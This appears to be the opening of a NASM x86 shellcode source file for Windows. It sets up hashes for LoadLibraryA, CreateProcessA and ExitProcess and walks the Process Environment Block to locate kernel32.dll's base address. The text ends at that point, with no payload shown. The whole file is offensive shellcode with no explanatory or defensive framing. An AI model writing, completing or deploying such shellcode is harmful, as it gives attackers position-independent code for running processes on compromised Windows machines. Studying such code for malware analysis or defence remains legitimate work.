;Point to kernel32 so we can use LoadLibraryA at execution to get our tools
global _main

SECTION .data

SECTION .text
;function addresses we want to get later
 db 0x30 	; LoadLibraryA ; pop ecx
 db 0x20 	; CreateProcessA ; or ecx, 0x203062d3
 db 0x41 	; ExitProcess

_main:
 cdq 					; set edx = 0 (eax points to stack so is
						; 				< 0x80000000)
 xchg eax, esi 			; esi = addr of first function hash
 lea edi, [esi - 0x18]	; edi = addr to get to needed func addresses

; find base addr of kernel32.dll
 mov ebx, dword [fs:edx + 0x30] ; ebx = address of PEB
 mov ecx, [ebx + 0x0c] ; ecx = pointer to loader data
 mov ecx, [ecx + 0x1c] ; ecx = first entry in initialisation order
 
 ; list
 mov ecx, [ecx] ; ecx = second entry in list (kernel32.dll)
 mov ebp, [ecx + 0x08] ; ebp = base address of kernel32.dll 
